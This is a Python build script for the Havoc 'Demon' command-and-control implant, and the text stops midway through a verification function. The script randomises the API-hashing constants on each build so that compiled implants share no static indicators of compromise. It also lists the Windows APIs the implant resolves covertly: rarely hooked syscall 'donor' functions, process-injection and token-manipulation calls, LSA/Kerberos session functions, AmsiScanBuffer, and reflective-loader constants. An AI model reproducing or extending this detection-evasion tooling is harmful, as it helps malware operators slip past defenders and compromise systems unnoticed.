#!/usr/bin/env python3
"""
Polymorphic Build Script for Havoc Demon Agent

Generates compile-time randomised hash constants using FNV-1a with a random seed.
Each build produces unique hash values — no two builds share static IOCs.

Usage:
    python3 polymorphic_build.py [--seed SEED] [--verify] [--output-dir DIR]

If --seed is not provided, a random seed is generated.
If --verify is set, validates the API name mappings against known DJB2 hashes.
"""

import os
import sys
import struct
import random
import argparse
import time

# ============================================================================
# Hash Algorithm Implementations
# ============================================================================

FNV_PRIME_32 = 0x01000193
FNV_OFFSET_32 = 0x811c9dc5  # Default FNV-1a offset basis (not used — we randomise)

def fnv1a_ascii(string, seed, upper=False):
    """FNV-1a hash on ASCII string. If upper=True, uppercases each char before hashing."""
    h = seed & 0xFFFFFFFF
    for c in string:
        byte = ord(c)
        if upper and byte >= ord('a') and byte <= ord('z'):
            byte -= 0x20
        h ^= byte
        h = (h * FNV_PRIME_32) & 0xFFFFFFFF
    return h

def fnv1a_wide(string, seed, upper=True):
    """
    FNV-1a hash on UTF-16LE string with Length parameter.
    Replicates the HashEx() null-byte skip behaviour for wide strings.
    """
    raw = string.encode('utf-16-le')
    length = len(raw)
    h = seed & 0xFFFFFFFF
    ptr = 0
    while True:
        if ptr >= length:
            break
        character = raw[ptr]
        # Null byte handling: skip null, but still hash 0
        if character == 0:
            ptr += 1  # Skip null
            if ptr >= length:
                h ^= 0
                h = (h * FNV_PRIME_32) & 0xFFFFFFFF
                break
        # Uppercase
        if upper and character >= ord('a') and character <= ord('z'):
            character -= 0x20
        h ^= character
        h = (h * FNV_PRIME_32) & 0xFFFFFFFF
        ptr += 1
    return h

# Legacy DJB2 for verification
def djb2_ascii(string, seed=5381, upper=False):
    h = seed
    for c in string:
        byte = ord(c)
        if upper and byte >= ord('a') and byte <= ord('z'):
            byte -= 0x20
        h = ((h << 5) + h + byte) & 0xFFFFFFFF
    return h

def djb2_wide(string, seed=5381, upper=True):
    raw = string.encode('utf-16-le')
    length = len(raw)
    h = seed
    ptr = 0
    while True:
        if ptr >= length:
            break
        character = raw[ptr]
        if character == 0:
            ptr += 1
            if ptr >= length:
                h = ((h << 5) + h + 0) & 0xFFFFFFFF
                break
        if upper and character >= ord('a') and character <= ord('z'):
            character -= 0x20
        h = ((h << 5) + h + character) & 0xFFFFFFFF
        ptr += 1
    return h


# ============================================================================
# API Name Mappings
# ============================================================================
# Format: (define_name, actual_api_name, hash_type)
# hash_type: 'func' = ASCII uppercase, 'module' = wide uppercase, 'coffapi' = ASCII case-sensitive

# --- Win32 Functions (HashEx with Upper=TRUE on ASCII export names) ---
FUNC_MAPPINGS = [
    # Ntdll Loader
    ("H_FUNC_LDRLOADDLL",                       "LdrLoadDll"),
    ("H_FUNC_LDRGETPROCEDUREADDRESS",           "LdrGetProcedureAddress"),

    # Nt* syscall functions
    ("H_FUNC_NTADDBOOTENTRY",                   "NtAddBootEntry"),
    # Syscall donor functions (rarely hooked)
    ("H_FUNC_NTQUERYTIMERRESOLUTION",          "NtQueryTimerResolution"),
    ("H_FUNC_NTFLUSHWRITEBUFFER",              "NtFlushWriteBuffer"),
    ("H_FUNC_NTQUERYPERFORMANCECOUNTER",       "NtQueryPerformanceCounter"),
    ("H_FUNC_NTQUERYDEBUGFILTERSTATE",         "NtQueryDebugFilterState"),
    ("H_FUNC_NTSETTIMERRESOLUTION",            "NtSetTimerResolution"),
    ("H_FUNC_NTQUERYDEFAULTLOCALE",            "NtQueryDefaultLocale"),
    ("H_FUNC_NTQUERYDEFAULTUILANGUAGE",        "NtQueryDefaultUILanguage"),
    ("H_FUNC_NTALLOCATEVIRTUALMEMORY",          "NtAllocateVirtualMemory"),
    ("H_FUNC_NTFREEVIRTUALMEMORY",              "NtFreeVirtualMemory"),
    ("H_FUNC_NTUNMAPVIEWOFSECTION",             "NtUnmapViewOfSection"),
    ("H_FUNC_NTWRITEVIRTUALMEMORY",             "NtWriteVirtualMemory"),
    ("H_FUNC_NTSETINFORMATIONVIRTUALMEMORY",    "NtSetInformationVirtualMemory"),
    ("H_FUNC_NTQUERYVIRTUALMEMORY",             "NtQueryVirtualMemory"),
    ("H_FUNC_NTOPENPROCESSTOKEN",               "NtOpenProcessToken"),
    ("H_FUNC_NTOPENTHREADTOKEN",                "NtOpenThreadToken"),
    ("H_FUNC_NTQUERYOBJECT",                    "NtQueryObject"),
    ("H_FUNC_NTTRACEEVENT",                     "NtTraceEvent"),
    ("H_FUNC_NTOPENPROCESS",                    "NtOpenProcess"),
    ("H_FUNC_NTTERMINATEPROCESS",               "NtTerminateProcess"),
    ("H_FUNC_NTOPENTHREAD",                     "NtOpenThread"),
    ("H_FUNC_NTSETCONTEXTTHREAD",               "NtSetContextThread"),
    ("H_FUNC_NTGETCONTEXTTHREAD",               "NtGetContextThread"),
    ("H_FUNC_NTCLOSE",                          "NtClose"),
    ("H_FUNC_NTCONTINUE",                       "NtContinue"),
    ("H_FUNC_NTSETEVENT",                       "NtSetEvent"),
    ("H_FUNC_NTCREATEEVENT",                    "NtCreateEvent"),
    ("H_FUNC_NTWAITFORSINGLEOBJECT",            "NtWaitForSingleObject"),
    ("H_FUNC_NTSIGNALANDWAITFORSINGLEOBJECT",   "NtSignalAndWaitForSingleObject"),
    ("H_FUNC_NTGETNEXTTHREAD",                  "NtGetNextThread"),
    ("H_FUNC_NTRESUMETHREAD",                   "NtResumeThread"),
    ("H_FUNC_NTSUSPENDTHREAD",                  "NtSuspendThread"),
    ("H_FUNC_NTDUPLICATEOBJECT",                "NtDuplicateObject"),
    ("H_FUNC_NTQUERYINFORMATIONTHREAD",         "NtQueryInformationThread"),
    ("H_FUNC_NTCREATETHREADEX",                 "NtCreateThreadEx"),
    ("H_FUNC_NTQUEUEAPCTHREAD",                 "NtQueueApcThread"),
    ("H_FUNC_NTQUERYSYSTEMINFORMATION",         "NtQuerySystemInformation"),
    ("H_FUNC_NTQUERYINFORMATIONTOKEN",          "NtQueryInformationToken"),
    ("H_FUNC_NTQUERYINFORMATIONPROCESS",        "NtQueryInformationProcess"),
    ("H_FUNC_NTSETINFORMATIONTHREAD",           "NtSetInformationThread"),
    ("H_FUNC_NTPROTECTVIRTUALMEMORY",           "NtProtectVirtualMemory"),
    ("H_FUNC_NTREADVIRTUALMEMORY",              "NtReadVirtualMemory"),
    ("H_FUNC_NTTERMINATETHREAD",                "NtTerminateThread"),
    ("H_FUNC_NTDUPLICATETOKEN",                 "NtDuplicateToken"),
    ("H_FUNC_NTALERTRESUMETHREAD",              "NtAlertResumeThread"),
    ("H_FUNC_NTTESTALERT",                      "NtTestAlert"),

    # Rtl* functions
    ("H_FUNC_RTLALLOCATEHEAP",                  "RtlAllocateHeap"),
    ("H_FUNC_RTLREALLOCATEHEAP",                "RtlReAllocateHeap"),
    ("H_FUNC_RTLFREEHEAP",                      "RtlFreeHeap"),
    ("H_FUNC_RTLEXITUSERPROCESS",               "RtlExitUserProcess"),
    ("H_FUNC_RTLRANDOMEX",                      "RtlRandomEx"),
    ("H_FUNC_RTLNTSTATUSTODOSERROR",            "RtlNtStatusToDosError"),
    ("H_FUNC_RTLGETVERSION",                    "RtlGetVersion"),
    ("H_FUNC_RTLADDVECTOREDEXCEPTIONHANDLER",   "RtlAddVectoredExceptionHandler"),
    ("H_FUNC_RTLREMOVEVECTOREDEXCEPTIONHANDLER","RtlRemoveVectoredExceptionHandler"),
    ("H_FUNC_RTLCREATETIMERQUEUE",              "RtlCreateTimerQueue"),
    ("H_FUNC_RTLDELETETIMERQUEUE",              "RtlDeleteTimerQueue"),
    ("H_FUNC_RTLCREATETIMER",                   "RtlCreateTimer"),
    ("H_FUNC_RTLQUEUEWORKITEM",                 "RtlQueueWorkItem"),
    ("H_FUNC_RTLREGISTERWAIT",                  "RtlRegisterWait"),
    ("H_FUNC_RTLCAPTURECONTEXT",                "RtlCaptureContext"),
    ("H_FUNC_RTLCOPYMAPPEDMEMORY",              "RtlCopyMappedMemory"),
    ("H_FUNC_RTLFILLMEMORY",                    "RtlFillMemory"),
    ("H_FUNC_RTLEXITUSERTHREAD",                "RtlExitUserThread"),
    ("H_FUNC_RTLSUBAUTHORITYSID",               "RtlSubAuthoritySid"),
    ("H_FUNC_RTLSUBAUTHORITYCOUNTSID",          "RtlSubAuthorityCountSid"),

    # Kernel32 functions
    ("H_FUNC_LOADLIBRARYW",                     "LoadLibraryW"),
    ("H_FUNC_GETCOMPUTERNAMEEXA",               "GetComputerNameExA"),
    ("H_FUNC_WAITFORSINGLEOBJECTEX",            "WaitForSingleObjectEx"),
    ("H_FUNC_VIRTUALPROTECT",                   "VirtualProtect"),
    ("H_FUNC_GETMODULEHANDLEA",                 "GetModuleHandleA"),
    ("H_FUNC_GETPROCADDRESS",                   "GetProcAddress"),
    ("H_FUNC_GETCURRENTDIRECTORYW",             "GetCurrentDirectoryW"),
    ("H_FUNC_FINDFIRSTFILEW",                   "FindFirstFileW"),
    ("H_FUNC_FINDNEXTFILEW",                    "FindNextFileW"),
    ("H_FUNC_FINDCLOSE",                        "FindClose"),
    ("H_FUNC_FILETIMETOSYSTEMTIME",             "FileTimeToSystemTime"),
    ("H_FUNC_SYSTEMTIMETOTZSPECIFICLOCALTIME",  "SystemTimeToTzSpecificLocalTime"),
    ("H_FUNC_OUTPUTDEBUGSTRINGA",               "OutputDebugStringA"),
    ("H_FUNC_DEBUGBREAK",                       "DebugBreak"),
    # H_FUNC_SYSTEMFUNCTION032 removed — replaced by custom ObfXorCrypt
    ("H_FUNC_LOOKUPACCOUNTSIDW",                "LookupAccountSidW"),
    ("H_FUNC_LOGONUSEREXW",                     "LogonUserExW"),
    ("H_FUNC_VSNPRINTF",                        "vsnprintf"),
    ("H_FUNC_GETADAPTERSINFO",                  "GetAdaptersInfo"),

    # WinHTTP functions
    ("H_FUNC_WINHTTPOPEN",                      "WinHttpOpen"),
    ("H_FUNC_WINHTTPCONNECT",                   "WinHttpConnect"),
    ("H_FUNC_WINHTTPOPENREQUEST",               "WinHttpOpenRequest"),
    ("H_FUNC_WINHTTPSETOPTION",                 "WinHttpSetOption"),
    ("H_FUNC_WINHTTPSENDREQUEST",               "WinHttpSendRequest"),
    ("H_FUNC_WINHTTPRECEIVERESPONSE",           "WinHttpReceiveResponse"),
    ("H_FUNC_WINHTTPADDREQUESTHEADERS",         "WinHttpAddRequestHeaders"),
    ("H_FUNC_WINHTTPREADDATA",                  "WinHttpReadData"),
    ("H_FUNC_WINHTTPQUERYHEADERS",              "WinHttpQueryHeaders"),
    ("H_FUNC_WINHTTPCLOSEHANDLE",               "WinHttpCloseHandle"),
    ("H_FUNC_WINHTTPGETIEPROXYCONFIGFORCURRENTUSER", "WinHttpGetIEProxyConfigForCurrentUser"),
    ("H_FUNC_WINHTTPGETPROXYFORURL",            "WinHttpGetProxyForUrl"),

    # More Kernel32
    ("H_FUNC_VIRTUALPROTECTEX",                 "VirtualProtectEx"),
    ("H_FUNC_LOCALALLOC",                       "LocalAlloc"),
    ("H_FUNC_LOCALREALLOC",                     "LocalReAlloc"),
    ("H_FUNC_LOCALFREE",                        "LocalFree"),
    ("H_FUNC_CREATEREMOTETHREAD",               "CreateRemoteThread"),
    ("H_FUNC_CREATETOOLHELP32SNAPSHOT",         "CreateToolhelp32Snapshot"),
    ("H_FUNC_PROCESS32FIRSTW",                  "Process32FirstW"),
    ("H_FUNC_PROCESS32NEXTW",                   "Process32NextW"),
    ("H_FUNC_CREATEPIPE",                       "CreatePipe"),
    ("H_FUNC_CREATEPROCESSW",                   "CreateProcessW"),
    ("H_FUNC_CREATEFILEW",                      "CreateFileW"),
    ("H_FUNC_GETFULLPATHNAMEW",                 "GetFullPathNameW"),
    ("H_FUNC_GETFILESIZE",                      "GetFileSize"),
    ("H_FUNC_GETFILESIZEEX",                    "GetFileSizeEx"),
    ("H_FUNC_CREATENAMEDPIPEW",                 "CreateNamedPipeW"),
    ("H_FUNC_CONVERTFIBERTOTHREAD",             "ConvertFiberToThread"),
    ("H_FUNC_CREATEFIBEREX",                    "CreateFiberEx"),
    ("H_FUNC_READFILE",                         "ReadFile"),
    ("H_FUNC_VIRTUALALLOCEX",                   "VirtualAllocEx"),
    ("H_FUNC_EXITPROCESS",                      "ExitProcess"),
    ("H_FUNC_GETEXITCODEPROCESS",               "GetExitCodeProcess"),
    ("H_FUNC_GETEXITCODETHREAD",                "GetExitCodeThread"),
    ("H_FUNC_CONVERTTHREADTOFIBEREX",           "ConvertThreadToFiberEx"),
    ("H_FUNC_SWITCHTOFIBER",                    "SwitchToFiber"),
    ("H_FUNC_DELETEFIBER",                      "DeleteFiber"),
    ("H_FUNC_ALLOCCONSOLE",                     "AllocConsole"),
    ("H_FUNC_FREECONSOLE",                      "FreeConsole"),
    ("H_FUNC_GETCONSOLEWINDOW",                 "GetConsoleWindow"),
    ("H_FUNC_GETSTDHANDLE",                     "GetStdHandle"),
    ("H_FUNC_SETSTDHANDLE",                     "SetStdHandle"),
    ("H_FUNC_WAITNAMEDPIPEW",                   "WaitNamedPipeW"),
    ("H_FUNC_PEEKNAMEDPIPE",                    "PeekNamedPipe"),
    ("H_FUNC_DISCONNECTNAMEDPIPE",              "DisconnectNamedPipe"),
    ("H_FUNC_WRITEFILE",                        "WriteFile"),
    ("H_FUNC_CONNECTNAMEDPIPE",                 "ConnectNamedPipe"),
    ("H_FUNC_FREELIBRARY",                      "FreeLibrary"),
    ("H_FUNC_GETFILEATTRIBUTESW",               "GetFileAttributesW"),
    ("H_FUNC_REMOVEDIRECTORYW",                 "RemoveDirectoryW"),
    ("H_FUNC_DELETEFILEW",                      "DeleteFileW"),
    ("H_FUNC_CREATEDIRECTORYW",                 "CreateDirectoryW"),
    ("H_FUNC_COPYFILEW",                        "CopyFileW"),
    ("H_FUNC_MOVEFILEEXW",                      "MoveFileExW"),
    ("H_FUNC_SETCURRENTDIRECTORYW",             "SetCurrentDirectoryW"),
    ("H_FUNC_WOW64DISABLEWOW64FSREDIRECTION",   "Wow64DisableWow64FsRedirection"),
    ("H_FUNC_WOW64REVERTWOW64FSREDIRECTION",    "Wow64RevertWow64FsRedirection"),
    ("H_FUNC_GETSYSTEMTIMEASFILETIME",          "GetSystemTimeAsFileTime"),
    ("H_FUNC_GETLOCALTIME",                     "GetLocalTime"),
    ("H_FUNC_DUPLICATEHANDLE",                  "DuplicateHandle"),
    ("H_FUNC_ATTACHCONSOLE",                    "AttachConsole"),
    ("H_FUNC_WRITECONSOLEA",                    "WriteConsoleA"),
    ("H_FUNC_TERMINATEPROCESS",                 "TerminateProcess"),
    ("H_FUNC_GETTOKENINFORMATION",              "GetTokenInformation"),
    ("H_FUNC_CREATEPROCESSWITHTOKENW",          "CreateProcessWithTokenW"),
    ("H_FUNC_CREATEPROCESSWITHLOGONW",          "CreateProcessWithLogonW"),
    ("H_FUNC_REVERTTOSELF",                     "RevertToSelf"),
    ("H_FUNC_GETUSERNAMEA",                     "GetUserNameA"),
    ("H_FUNC_LOGONUSERW",                       "LogonUserW"),
    ("H_FUNC_LOOKUPACCOUNTSIDA",                "LookupAccountSidA"),
    ("H_FUNC_OPENTHREADTOKEN",                  "OpenThreadToken"),
    ("H_FUNC_OPENPROCESSTOKEN",                 "OpenProcessToken"),
    ("H_FUNC_ADJUSTTOKENPRIVILEGES",            "AdjustTokenPrivileges"),
    ("H_FUNC_LOOKUPPRIVILEGENAMEA",             "LookupPrivilegeNameA"),
    ("H_FUNC_FREESID",                          "FreeSid"),
    ("H_FUNC_SETSECURITYDESCRIPTORSACL",        "SetSecurityDescriptorSacl"),
    ("H_FUNC_SETSECURITYDESCRIPTORDACL",        "SetSecurityDescriptorDacl"),
    ("H_FUNC_INITIALIZESECURITYDESCRIPTOR",     "InitializeSecurityDescriptor"),
    ("H_FUNC_ADDMANDATORYACE",                  "AddMandatoryAce"),
    ("H_FUNC_INITIALIZEACL",                    "InitializeAcl"),
    ("H_FUNC_ALLOCATEANDINITIALIZESID",         "AllocateAndInitializeSid"),
    ("H_FUNC_CHECKTOKENMEMBERSHIP",             "CheckTokenMembership"),
    ("H_FUNC_SETENTRIESINACLW",                 "SetEntriesInAclW"),
    ("H_FUNC_SETTHREADTOKEN",                   "SetThreadToken"),
    ("H_FUNC_LSANTSTATUSTOWINERROR",            "LsaNtStatusToWinError"),
    ("H_FUNC_EQUALSID",                         "EqualSid"),
    ("H_FUNC_CONVERTSIDTOSTRINGSIDW",           "ConvertSidToStringSidW"),
    ("H_FUNC_GETSIDSUBAUTHORITYCOUNT",          "GetSidSubAuthorityCount"),
    ("H_FUNC_GETSIDSUBAUTHORITY",               "GetSidSubAuthority"),
    ("H_FUNC_LOOKUPPRIVILEGEVALUEA",            "LookupPrivilegeValueA"),

    # OLE/COM
    ("H_FUNC_SAFEARRAYACCESSDATA",              "SafeArrayAccessData"),
    ("H_FUNC_SAFEARRAYUNACCESSDATA",            "SafeArrayUnaccessData"),
    ("H_FUNC_SAFEARRAYCREATE",                  "SafeArrayCreate"),
    ("H_FUNC_SAFEARRAYPUTELEMENT",              "SafeArrayPutElement"),
    ("H_FUNC_SAFEARRAYCREATEVECTOR",            "SafeArrayCreateVector"),
    ("H_FUNC_SAFEARRAYDESTROY",                 "SafeArrayDestroy"),
    ("H_FUNC_SYSALLOCSTRING",                   "SysAllocString"),

    # Shell32
    ("H_FUNC_COMMANDLINETOARGVW",               "CommandLineToArgvW"),

    # User32/GDI32
    ("H_FUNC_SHOWWINDOW",                       "ShowWindow"),
    ("H_FUNC_GETSYSTEMMETRICS",                 "GetSystemMetrics"),
    ("H_FUNC_GETDC",                            "GetDC"),
    ("H_FUNC_RELEASEDC",                        "ReleaseDC"),
    ("H_FUNC_GETCURRENTOBJECT",                 "GetCurrentObject"),
    ("H_FUNC_GETOBJECTW",                       "GetObjectW"),
    ("H_FUNC_CREATECOMPATIBLEDC",               "CreateCompatibleDC"),
    ("H_FUNC_CREATEDIBSECTION",                 "CreateDIBSection"),
    ("H_FUNC_SELECTOBJECT",                     "SelectObject"),
    ("H_FUNC_BITBLT",                           "BitBlt"),
    ("H_FUNC_DELETEOBJECT",                     "DeleteObject"),
    ("H_FUNC_DELETEDC",                         "DeleteDC"),

    # CFG
    ("H_FUNC_SETPROCESSVALIDCALLTARGETS",       "SetProcessValidCallTargets"),

    # CLR
    ("H_FUNC_CLRCREATEINSTANCE",                "CLRCreateInstance"),

    # Network
    ("H_FUNC_NETLOCALGROUPENUM",                "NetLocalGroupEnum"),
    ("H_FUNC_NETGROUPENUM",                     "NetGroupEnum"),
    ("H_FUNC_NETUSERENUM",                      "NetUserEnum"),
    ("H_FUNC_NETWKSTAUSERENUM",                 "NetWkstaUserEnum"),
    ("H_FUNC_NETSESSIONENUM",                   "NetSessionEnum"),
    ("H_FUNC_NETSHAREENUM",                     "NetShareEnum"),
    ("H_FUNC_NETAPIBUFFERFREE",                 "NetApiBufferFree"),

    # Winsock
    ("H_FUNC_WSASTARTUP",                       "WSAStartup"),
    ("H_FUNC_WSACLEANUP",                       "WSACleanup"),
    ("H_FUNC_WSASOCKETA",                       "WSASocketA"),
    ("H_FUNC_WSAGETLASTERROR",                  "WSAGetLastError"),
    ("H_FUNC_IOCTLSOCKET",                      "ioctlsocket"),
    ("H_FUNC_BIND",                             "bind"),
    ("H_FUNC_LISTEN",                           "listen"),
    ("H_FUNC_ACCEPT",                           "accept"),
    ("H_FUNC_CLOSESOCKET",                      "closesocket"),
    ("H_FUNC_RECV",                             "recv"),
    ("H_FUNC_SEND",                             "send"),
    ("H_FUNC_CONNECT",                          "connect"),
    ("H_FUNC_GETADDRINFO",                      "getaddrinfo"),
    ("H_FUNC_FREEADDRINFO",                     "freeaddrinfo"),

    # Kerberos/LSA
    ("H_FUNC_LSAREGISTERLOGONPROCESS",          "LsaRegisterLogonProcess"),
    ("H_FUNC_LSALOOKUPAUTHENTICATIONPACKAGE",   "LsaLookupAuthenticationPackage"),
    ("H_FUNC_LSADEREGISTERLOGONPROCESS",        "LsaDeregisterLogonProcess"),
    ("H_FUNC_LSACONNECTUNTRUSTED",              "LsaConnectUntrusted"),
    ("H_FUNC_LSAFREERETURNBUFFER",              "LsaFreeReturnBuffer"),
    ("H_FUNC_LSACALLAUTHENTICATIONPACKAGE",     "LsaCallAuthenticationPackage"),
    ("H_FUNC_LSAGETLOGONSESSIONDATA",           "LsaGetLogonSessionData"),
    ("H_FUNC_LSAENUMERATELOGONSESSIONS",        "LsaEnumerateLogonSessions"),

    # Misc
    ("H_FUNC_SLEEP",                            "Sleep"),
    ("H_FUNC_CREATETHREAD",                     "CreateThread"),
    ("H_FUNC_AMSISCANBUFFER",                   "AmsiScanBuffer"),
    ("H_FUNC_GLOBALFREE",                       "GlobalFree"),
    ("H_FUNC_SWPRINTF_S",                       "swprintf_s"),
]

# --- Module hashes (HashEx on UTF-16LE wide strings with Upper=TRUE) ---
MODULE_MAPPINGS = [
    ("H_MODULE_KERNEL32",   "kernel32.dll"),
    ("H_MODULE_NTDLL",      "ntdll.dll"),
]

# --- COFF API hashes (HashStringA — case-sensitive DJB2 on ASCII) ---
# These are the BOF symbol names that BOFs import
COFFAPI_MAPPINGS = [
    # Beacon API
    ("H_COFFAPI_BEACONDATAPARSER",              "BeaconDataParse"),
    ("H_COFFAPI_BEACONDATAINT",                 "BeaconDataInt"),
    ("H_COFFAPI_BEACONDATASHORT",               "BeaconDataShort"),
    ("H_COFFAPI_BEACONDATALENGTH",              "BeaconDataLength"),
    ("H_COFFAPI_BEACONDATAEXTRACT",             "BeaconDataExtract"),
    ("H_COFFAPI_BEACONFORMATALLOC",             "BeaconFormatAlloc"),
    ("H_COFFAPI_BEACONFORMATRESET",             "BeaconFormatReset"),
    ("H_COFFAPI_BEACONFORMATFREE",              "BeaconFormatFree"),
    ("H_COFFAPI_BEACONFORMATAPPEND",            "BeaconFormatAppend"),
    ("H_COFFAPI_BEACONFORMATPRINTF",            "BeaconFormatPrintf"),
    ("H_COFFAPI_BEACONFORMATTOSTRING",          "BeaconFormatToString"),
    ("H_COFFAPI_BEACONFORMATINT",               "BeaconFormatInt"),
    ("H_COFFAPI_BEACONPRINTF",                  "BeaconPrintf"),
    ("H_COFFAPI_BEACONOUTPUT",                  "BeaconOutput"),
    ("H_COFFAPI_BEACONUSETOKEN",                "BeaconUseToken"),
    ("H_COFFAPI_BEACONREVERTTOKEN",             "BeaconRevertToken"),
    ("H_COFFAPI_BEACONISADMIN",                 "BeaconIsAdmin"),
    ("H_COFFAPI_BEACONGETSPAWNTO",              "BeaconGetSpawnTo"),
    ("H_COFFAPI_BEACONSPAWNTEMPORARYPROCESS",   "BeaconSpawnTemporaryProcess"),
    ("H_COFFAPI_BEACONINJECTPROCESS",           "BeaconInjectProcess"),
    ("H_COFFAPI_BEACONINJECTTEMPORARYPROCESS",  "BeaconInjectTemporaryProcess"),
    ("H_COFFAPI_BEACONCLEANUPPROCESS",          "BeaconCleanupProcess"),
    ("H_COFFAPI_BEACONINFORMATION",             "BeaconInformation"),
    ("H_COFFAPI_BEACONADDVALUE",                "BeaconAddValue"),
    ("H_COFFAPI_BEACONGETVALUE",                "BeaconGetValue"),
    ("H_COFFAPI_BEACONREMOVEVALUE",             "BeaconRemoveValue"),
    ("H_COFFAPI_BEACONDATASTOREGETITEM",        "BeaconDataStoreGetItem"),
    ("H_COFFAPI_BEACONDATASTOREPROTECTITEM",    "BeaconDataStoreProtectItem"),
    ("H_COFFAPI_BEACONDATASTOREUNPROTECTITEM",  "BeaconDataStoreUnprotectItem"),
    ("H_COFFAPI_BEACONDATASTOREMAXENTRIES",     "BeaconDataStoreMaxEntries"),
    ("H_COFFAPI_BEACONGETCUSTOMUSERDATA",       "BeaconGetCustomUserData"),

    # Loader API
    ("H_COFFAPI_TOWIDECHAR",                    "toWideChar"),
    ("H_COFFAPI_LOADLIBRARYA",                  "LoadLibraryA"),
    ("H_COFFAPI_GETPROCADDRESS",                "GetProcAddress"),
    ("H_COFFAPI_GETMODULEHANDLE",               "GetModuleHandleA"),
    ("H_COFFAPI_FREELIBRARY",                   "FreeLibrary"),
    ("H_COFFAPI_LOCALFREE",                     "LocalFree"),

    # Nt API for BOFs
    ("H_COFFAPI_NTOPENTHREAD",                  "NtOpenThread"),
    ("H_COFFAPI_NTOPENPROCESS",                 "NtOpenProcess"),
    ("H_COFFAPI_NTTERMINATEPROCESS",            "NtTerminateProcess"),
    ("H_COFFAPI_NTOPENTHREADTOKEN",             "NtOpenThreadToken"),
    ("H_COFFAPI_NTOPENPROCESSTOKEN",            "NtOpenProcessToken"),
    ("H_COFFAPI_NTDUPLICATETOKEN",              "NtDuplicateToken"),
    ("H_COFFAPI_NTQUEUEAPCTHREAD",              "NtQueueApcThread"),
    ("H_COFFAPI_NTSUSPENDTHREAD",               "NtSuspendThread"),
    ("H_COFFAPI_NTRESUMETHREAD",                "NtResumeThread"),
    ("H_COFFAPI_NTCREATEEVENT",                 "NtCreateEvent"),
    ("H_COFFAPI_NTCREATETHREADEX",              "NtCreateThreadEx"),
    ("H_COFFAPI_NTDUPLICATEOBJECT",             "NtDuplicateObject"),
    ("H_COFFAPI_NTGETCONTEXTTHREAD",            "NtGetContextThread"),
    ("H_COFFAPI_NTSETCONTEXTTHREAD",            "NtSetContextThread"),
    ("H_COFFAPI_NTQUERYINFORMATIONPROCESS",     "NtQueryInformationProcess"),
    ("H_COFFAPI_NTQUERYSYSTEMINFORMATION",      "NtQuerySystemInformation"),
    ("H_COFFAPI_NTWAITFORSINGLEOBJECT",         "NtWaitForSingleObject"),
    ("H_COFFAPI_NTALLOCATEVIRTUALMEMORY",       "NtAllocateVirtualMemory"),
    ("H_COFFAPI_NTWRITEVIRTUALMEMORY",          "NtWriteVirtualMemory"),
    ("H_COFFAPI_NTFREEVIRTUALMEMORY",           "NtFreeVirtualMemory"),
    ("H_COFFAPI_NTUNMAPVIEWOFSECTION",          "NtUnmapViewOfSection"),
    ("H_COFFAPI_NTPROTECTVIRTUALMEMORY",        "NtProtectVirtualMemory"),
    ("H_COFFAPI_NTREADVIRTUALMEMORY",           "NtReadVirtualMemory"),
    ("H_COFFAPI_NTTERMINATETHREAD",             "NtTerminateThread"),
    ("H_COFFAPI_NTALERTRESUMETHREAD",           "NtAlertResumeThread"),
    ("H_COFFAPI_NTSIGNALANDWAITFORSINGLEOBJECT","NtSignalAndWaitForSingleObject"),
    ("H_COFFAPI_NTQUERYVIRTUALMEMORY",          "NtQueryVirtualMemory"),
    ("H_COFFAPI_NTQUERYINFORMATIONTOKEN",       "NtQueryInformationToken"),
    ("H_COFFAPI_NTQUERYINFORMATIONTHREAD",      "NtQueryInformationThread"),
    ("H_COFFAPI_NTQUERYOBJECT",                 "NtQueryObject"),
    ("H_COFFAPI_NTCLOSE",                       "NtClose"),
    ("H_COFFAPI_NTSETINFORMATIONTHREAD",        "NtSetInformationThread"),
    ("H_COFFAPI_NTSETINFORMATIONVIRTUALMEMORY", "NtSetInformationVirtualMemory"),
    ("H_COFFAPI_NTGETNEXTTHREAD",               "NtGetNextThread"),
]

# --- KaynLdr / Shellcode hash constants ---
# These are used in the shellcode reflective loader
KAYNLDR_FUNC_MAPPINGS = [
    ("SYS_LDRLOADDLL",                  "LdrLoadDll"),
    ("SYS_NTALLOCATEVIRTUALMEMORY",     "NtAllocateVirtualMemory"),
    ("SYS_NTPROTECTEDVIRTUALMEMORY",    "NtProtectVirtualMemory"),
]

KAYNLDR_MODULE_MAPPINGS = [
    ("NTDLL_HASH",  "ntdll.dll"),
]

# --- DllLdr hash constants ---
DLLLDR_FUNC_MAPPINGS = [
    ("SYS_LDRLOADDLL",                  "LdrLoadDll"),
    ("SYS_NTALLOCATEVIRTUALMEMORY",     "NtAllocateVirtualMemory"),
    ("SYS_NTPROTECTEDVIRTUALMEMORY",    "NtProtectVirtualMemory"),
    ("SYS_NTFLUSHINSTRUCTIONCACHE",     "NtFlushInstructionCache"),
]

DLLLDR_MODULE_MAPPINGS = [
    ("NTDLL_HASH",  "ntdll.dll"),
]

# --- Hardcoded hash constants in C source files ---
# These use HashStringA (case-sensitive FNV-1a)
COFFEELDR_HASH_MAPPINGS_X64 = [
    ("COFF_PREP_SYMBOL",    "__imp_"),
    ("COFF_PREP_BEACON",    "__imp_Beacon"),
    ("COFF_INSTANCE",       ".refptr.Instance"),
]

COFFEELDR_HASH_MAPPINGS_X86 = [
    ("COFF_PREP_SYMBOL",    "__imp__"),
    ("COFF_PREP_BEACON",    "__imp__Beacon"),
    ("COFF_INSTANCE",       "_Instance"),
]

INJECTUTIL_HASH_MAPPINGS = [
    ("ReflectiveLoader",    "ReflectiveLoader"),
    ("KaynLoader",          "KaynLoader"),
]


# ============================================================================
# Verification
# ============================================================================

def verify_mappings(seed):
    """Verify that our API name mappings produce the correct FNV-1a hashes."""
    import re

    script_dir = os.path.dirname(os.path.abspath(__file__))
    repo_root = os.path.abspath(os.path.join(script_dir, '..', '..', '..'))

    # Read the existing Defines.h
    defines_path = os.path.join(script_dir, '..', 'include', 'common', 'Defines.h')
    with open(defines_path) as f:
        content = f.read()

    # Extract existing hash values
    existing = {}
    for m in re.finditer(r'#define\s+(\w+)\s+0x([0-9a-fA-F]+)', content):
        existing[m.group(1)] = int(m.group(2), 16)

    errors = 0
    verified = 0

    # Verify H_FUNC entries (FNV-1a, uppercase)
    for define, api_name in FUNC_MAPPINGS:
        expected = existing.get(define)
        if expected is None:
            print(f"  WARN: {define} not found in Defines.h")
            continue
        computed = fnv1a_ascii(api_name, seed, upper=True)
        if computed != expected:
            print(f"  FAIL: {define} ({api_name}): computed=0x{computed:08x}, expected=0x{expected:08x}")
            errors += 1
        else:
            verified += 1

    # Verify H_MODULE entries (FNV-1a, wide, uppercase)
    for define, module_name in MODULE_MAPPINGS:
